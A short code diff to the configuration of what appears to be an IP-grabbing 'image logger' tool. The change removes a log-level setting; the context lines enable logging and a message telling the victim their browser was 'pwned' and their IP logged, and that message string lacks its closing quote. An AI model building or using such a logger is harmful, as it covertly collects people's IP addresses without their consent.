@@ -28,8 +28,6 @@ config = {
     
     "enableLogging": True,
     
-"logLevel": "info",
-    
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
         "message": "This browser has been pwned by DeKrypt's Image Logger. your ip has been logged, # Message to show
